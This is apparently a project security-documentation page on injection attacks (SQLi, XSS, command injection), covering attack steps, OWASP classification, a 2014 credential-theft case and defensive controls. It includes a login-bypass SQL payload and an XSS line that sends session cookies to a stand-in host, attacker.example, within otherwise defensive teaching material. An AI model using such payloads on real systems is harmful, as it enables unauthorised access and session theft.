# Injection Attacks (SQLi, XSS, Command Injection)

> Injection attacks occur when an application passes untrusted, attacker-controlled data to an interpreter — a database engine, a browser renderer, a shell — in a way that the interpreter executes as a command rather than treating it as inert data.

## What it is

Injection is a broad family of vulnerabilities that share one root cause: the application fails to enforce a strict boundary between data and instructions. SQL injection (`SQLi`) tricks a relational database engine into executing attacker-supplied SQL statements embedded in what should be a parameter. Cross-site scripting (`XSS`) causes a browser to execute attacker-controlled JavaScript that was stored or reflected through the server without sanitization. Command injection targets the host OS shell, typically through functions that construct shell commands from user input — `exec`, `popen`, `subprocess.run` with `shell=True`, and their equivalents. All three variants share a common prerequisite: the application concatenates or interpolates untrusted input directly into a structured language without validation or escaping, collapsing the distinction between control flow and data payload.

## How the attack works

1. **Reconnaissance.** The attacker identifies an input surface — a search field, a URL parameter, an HTTP header, a JSON body field, a file upload name — that the server passes to an interpreter.
2. **Probe.** A minimal payload (`'`, `"`, `;`, `<script>`, `$(id)`) is submitted. Verbose error messages, unexpected output, or a detectable delay confirms that the input reaches the interpreter unfiltered.
3. **Payload crafting.** The attacker constructs a payload that closes the legitimate context and injects new instructions. The exact syntax depends on the target interpreter.
4. **Execution and extraction.** The interpreter runs the injected instruction: a database dumps its credential table, a browser executes a cookie-stealing script in a victim's session, or a shell spawns a reverse connection.
5. **Escalation.** With an initial foothold, the attacker pivots — exfiltrating data, writing web shells, or moving laterally through the infrastructure.

**Illustrative example — SQL injection (non-weaponized):**

A login form builds its query by string concatenation:

```sql
-- Intended query when username = alice and password = s3cr3t
SELECT id FROM users WHERE username = 'alice' AND password = 's3cr3t';

-- Attacker submits username: admin'--   password: (anything)
-- The resulting query becomes:
SELECT id FROM users WHERE username = 'admin'--' AND password = '...';
-- Everything after -- is a comment; the password check is silently dropped.
```

The `--` sequence begins a SQL comment, neutralizing the password predicate. The database returns the admin row, and the application grants access without a valid credential. Note: this pattern is illustrative; no working payload against any live target is provided here.

**Illustrative example — reflected XSS (non-weaponized):**

```html
<!-- Server reflects the "q" parameter verbatim into the page -->
<p>Results for: <script>alert('xss')</script></p>

<!-- An attacker crafts a link containing:  ?q=<script>fetch('https://attacker.example/c?'+document.cookie)</script>
     When a victim clicks the link, their browser executes the script in the origin's context,
     sending the session cookie to the attacker's collector. -->
```

## Real-world impact

SQL injection has been the mechanism behind some of the largest credential thefts on record. Reporting by KrebsOnSecurity (August 2014) documented a campaign in which a Russian criminal group accumulated over 1.2 billion unique username-and-password pairs by automating SQL injection attacks against hundreds of thousands of websites — the stolen credentials were subsequently weaponized for spam, phishing, and account-takeover fraud across unrelated services. The OWASP Top Ten has ranked injection #1 or near the top of web application risks in every edition since 2010, noting that the vulnerability class spans databases, LDAP directories, OS shells, XML parsers, and expression-language engines — meaning the aggregate exposure across a modern application stack is far wider than SQLi alone.

Source: [KrebsOnSecurity — SQL Injection coverage archive](https://krebsonsecurity.com/tag/sql-injection/)

## OWASP classification

Injection appears as **A03:2021 – Injection** in the OWASP Top Ten 2021 (merged with XSS) and as **A1:2017 – Injection** in the 2017 edition. The dedicated mitigation guidance lives in the Input Validation Cheat Sheet, which frames input validation as the first line of defence: all data crossing a trust boundary must be validated against an explicit allowlist of acceptable structure, length, type, and character set before it reaches any interpreter.

- OWASP Input Validation Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP Top Ten A1:2017 — Injection: <https://owasp.org/www-project-top-ten/2017/A1_2017-Injection>
- OWASP SQL Injection attack definition: <https://owasp.org/www-community/attacks/SQL_Injection>

## How defenders stop it

- **Parameterized queries / prepared statements** — the single most effective SQLi control; the database driver keeps data and SQL structure in separate channels so injected SQL syntax is treated as a literal string, never parsed as a command.
- **Allowlist input validation** — reject any input that does not match an explicit pattern for the expected type (UUID, integer range, enumerated value, ISO date). Blocklists that try to blacklist dangerous characters are fragile and bypassable.
- **Output encoding context-matched to the rendering layer** — HTML-encode before inserting into HTML, JavaScript-encode before inserting into a script context, URL-encode for query strings. A single encoding applied in the wrong context provides no protection.
- **Content Security Policy (`CSP`)** — restricts which origins may execute scripts in the browser, substantially reducing the blast radius of a successful XSS even when prevention fails.
- **Sandboxed command execution** — avoid shell=True; pass arguments as arrays to subprocess APIs so the OS never interprets the argument list through a shell.
- **Least-privilege database accounts** — a web app's DB user should have no `DROP`, `CREATE`, or `FILE` privileges, limiting what an attacker can do even after a successful SQLi.
- **Web Application Firewall (WAF)** — a defence-in-depth layer that can block well-known injection signatures in transit; not a substitute for secure coding.
- **Security-focused code review and SAST** — static analysis tools (Semgrep, CodeQL) flag unparameterized query construction and dangerous shell-call patterns at CI time.

In this project, see the defenses: [grobase](../defense/grobase/input-validation.md), [osionos-bridge](../defense/osionos-bridge/input-validation.md), [opposite-osiris](../defense/opposite-osiris/input-validation.md), [auth-gateway](../defense/auth-gateway/input-validation.md), [mail-calendar](../defense/mail-calendar/input-validation.md).

## References

- OWASP Input Validation Cheat Sheet — <https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html>
- OWASP Top Ten A1:2017 Injection — <https://owasp.org/www-project-top-ten/2017/A1_2017-Injection>
- OWASP SQL Injection — <https://owasp.org/www-community/attacks/SQL_Injection>
- KrebsOnSecurity SQL Injection archive — <https://krebsonsecurity.com/tag/sql-injection/>
